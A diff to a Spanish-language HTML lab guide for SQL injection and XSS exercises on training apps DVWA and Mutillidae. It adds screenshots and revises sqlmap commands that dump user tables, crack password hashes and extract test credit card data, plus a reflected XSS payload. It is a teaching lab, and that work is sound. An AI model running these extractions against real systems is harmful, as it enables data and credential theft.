@@ -213,19 +213,23 @@ Cookie: PHPSESSID=xxxx; security=low</pre></div>
       <h3>Reconocimiento (motor, BD y usuario)</h3>
       <div class="code"><button type="button">Copiar</button><pre>sqlmap -u "http://&lt;IP&gt;/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit" \
   --cookie="PHPSESSID=xxxx; security=low" -b --current-db --current-user --batch</pre></div>
+      <figure><img src="img/sqlmap-q-currentdb.png" alt="Sesión de SQLMap: banner MariaDB, current user app@localhost, current database dvwa"><figcaption>Paso <code>q</code> de la guía, ejecución real. SQLMap detecta el motor (<code>MariaDB</code>), el usuario (<code>app@localhost</code>) y la base actual (<code>dvwa</code>).</figcaption></figure>
     </div></li>
     <li><div class="step">
       <h3>Tablas y volcado de <code>users</code></h3>
-      <div class="code"><button type="button">Copiar</button><pre>sqlmap -u "..." --cookie="..." --tables --batch
-sqlmap -u "..." --cookie="..." -T users --dump --batch</pre></div>
+      <div class="code"><button type="button">Copiar</button><pre>sqlmap -u "..." --cookie="..." --tables -D dvwa --batch
+sqlmap -u "..." --cookie="..." --dump -T users -D dvwa --batch</pre></div>
       <p class="out">Aparecen <code>guestbook</code> y <code>users</code>. SQLMap crackea los MD5 contra su diccionario.</p>
+      <figure><img src="img/sqlmap-r-tables.png" alt="SQLMap --tables -D dvwa: muestra las tablas guestbook y users"><figcaption>Paso <code>r</code>: <code>--tables -D dvwa</code> lista <code>guestbook</code> y <code>users</code>, tal como indica la guía.</figcaption></figure>
+      <figure><img src="img/sqlmap-s-dump-users.png" alt="SQLMap --dump -T users con los prompts interactivos y el volcado de 5 usuarios con hashes crackeados"><figcaption>Paso <code>s</code>: el volcado con los <strong>prompts</strong> que menciona la guía (<code>store hashes [y/N] N</code>, <code>crack them [Y/n/q] Y</code>) y los 5 usuarios con sus hashes MD5 crackeados.</figcaption></figure>
     </div></li>
     <li><div class="step">
       <h3>Tarjetas de crédito en Mutillidae</h3>
       <p class="path">Mutillidae › User Lookup (page=user-info.php), parámetro inyectable username</p>
       <div class="code"><button type="button">Copiar</button><pre>sqlmap -u "http://&lt;IP&gt;/mutillidae/index.php?page=user-info.php&amp;username=1&amp;password=1&amp;user-info-php-submit-button=View+Account+Details" \
-  --cookie="PHPSESSID=xxxx" -p username -D owasp10 -T credit_cards --dump --batch</pre></div>
+  --cookie="PHPSESSID=xxxx" -p username -D mutillidae -T credit_cards --dump --batch</pre></div>
       <p>Columnas de <code>credit_cards</code>: <code>ccid, ccnumber, ccv, expiration</code>.</p>
+      <figure><img src="img/sqlmap-mutillidae-cards.png" alt="SQLMap volcando credit_cards de Mutillidae: prompt de cookie y las 5 tarjetas con número, CVV y expiración"><figcaption>Paso <code>t</code> (objetivo de la parte 3) con SQLMap, ejecución real sobre Mutillidae. Incluye el <strong>prompt</strong> de cookie (<code>Do you want to use those [Y/n] Y</code>) y el volcado de <code>credit_cards</code> con las 5 tarjetas. Son datos de prueba de Mutillidae, no tarjetas reales.</figcaption></figure>
       <figure><img src="img/sqlmap-dump.png" alt="SQLMap volcando la tabla dvwa.users con 5 registros y contraseñas crackeadas"><figcaption>Ejecución real de SQLMap sobre DVWA (Docker). Detecta la inyección en el parámetro <code>id</code>, vuelca <code>dvwa.users</code> y crackea los hashes (<code>password</code>, <code>abc123</code>, <code>charley</code>, <code>letmein</code>).</figcaption></figure>
       <figure><img src="img/mutillidae-cards.png" alt="UNION SELECT sobre credit_cards de Mutillidae: 5 tarjetas con número, CVV y expiración"><figcaption>Objetivo de la parte 3, ejecutado real sobre Mutillidae (Docker, Security 0). El UNION sobre <code>credit_cards</code> devuelve las 5 tarjetas (número, CVV, expiración). Son datos de prueba de Mutillidae, no tarjetas reales.</figcaption></figure>
       <div class="say">La misma extracción, hecha a mano con UNION, ya está verificada en <a href="evidencias/sqli-mutillidae.md">evidencias/sqli-mutillidae.md</a>: confirma el esquema y el resultado que SQLMap reproduce.</div>
@@ -243,7 +247,8 @@ sqlmap -u "..." --cookie="..." -T users --dump --batch</pre></div>
       <p class="path">DVWA › DVWA Security: Low › XSS (Reflected)</p>
       <div class="code"><button type="button">Copiar</button><pre>&lt;script&gt;alert('hola');&lt;/script&gt;</pre></div>
       <p>La app refleja el parámetro <code>name</code> sin codificar: el navegador ejecuta el script y sale el <em>alert</em>.</p>
-      <figure><div class="pending"><b>Captura pendiente</b><span>El <em>alert('hola')</em> disparado en DVWA.</span></div></figure>
+      <figure><img src="img/dvwa-xss-reflected.png" alt="Respuesta HTTP de DVWA: el payload script alert hola se refleja sin escapar dentro de la etiqueta pre"><figcaption>Evidencia real: la respuesta de DVWA devuelve <code>&lt;pre&gt;Hello &lt;script&gt;alert('hola');&lt;/script&gt;&lt;/pre&gt;</code> — el payload se refleja <strong>sin escapar</strong>, por lo que el navegador lo ejecuta y dispara el <em>alert</em>.</figcaption></figure>
+      <figure><div class="pending"><b>Captura opcional</b><span>El cuadro de <em>alert('hola')</em> nativo, de un clic abriendo la URL del payload en Firefox logueado en DVWA (Low).</span></div></figure>
     </div></li>
     <li><div class="step">
       <h3>XSS en Juice Shop: conteo y localizaciones</h3>
